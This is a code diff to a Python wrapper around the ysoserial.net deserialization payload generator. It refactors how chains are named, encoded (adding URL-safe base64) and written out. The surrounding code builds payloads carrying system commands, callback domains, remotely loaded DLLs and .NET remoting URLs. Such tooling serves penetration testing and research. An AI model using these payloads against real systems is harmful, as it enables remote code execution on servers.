@@ -74,7 +74,7 @@ class YSOSerialNet(Serializer):
                 chainParsingStart = True
                 chain = match.groupdict()
                 chain = {
-                    'id': chain['name'].lower(),
+                    'id': chain['name'],
                     'name': chain['name'],
                     'formatters': []
                 }
@@ -87,7 +87,7 @@ class YSOSerialNet(Serializer):
                 for formatter in formatters['formatters'].split(' , '):
                     formatter = formatter.strip().split(' ')[0]
                     chain['formatters'].append(formatter)
-                chain['description'] = f"{chain['name']} {' | '.join(chain['formatters'])}"
+                chain['description'] = f"{chain['name']}: {' | '.join(chain['formatters'])}"
 
 
                 if chain['name'] in self.specialPayloadFormats:
@@ -103,7 +103,7 @@ class YSOSerialNet(Serializer):
     def payload(self, chainName, chainArgs):
         return self.exec(f"{self.ysoserialNetOpts} -g '{chainName}' {chainArgs}", rawResult=True)
 
-    def generate(self, chains, output):
+    def generate(self, chains):
 
         if len(chains) == 0:
             return 0
@@ -127,8 +127,8 @@ class YSOSerialNet(Serializer):
             csharp_net_remoting = self.chainOpts.csharp_net_remoting.replace('%%domain%%', interact_domain)
             
 
-        logging.info(f"System command: {system_command}")
         logging.info(f"Interact domain: {interact_domain}")
+        logging.info(f"System command: {system_command}")
         logging.info(f"CSharp Code: {self.chainOpts.csharp_code}")
         logging.info(f"DLL loaded remotely: {csharp_remote_dll}")
         logging.info(f".Net remoting URL: {csharp_net_remoting}")
@@ -206,6 +206,8 @@ class YSOSerialNet(Serializer):
 
                     if self.chainOpts.base64:
                         payload = base64.b64encode(payload)
+                    elif self.chainOpts.base64_urlsafe:
+                        payload = base64.urlsafe_b64encode(payload)
                     
                     if self.chainOpts.url:
                         payload = urllib.parse.quote_plus(payload).encode('ascii')
@@ -216,7 +218,7 @@ class YSOSerialNet(Serializer):
                     if self.chainOpts.url:
                         payload = urllib.parse.quote_plus(payload).encode('ascii')
                 
-                output.write(payload+b"\n")
+                self.output(f"{chain['id']}_{formatter}", payload+b"\n")
                 count = count + 1
         
         # cleanup temp file
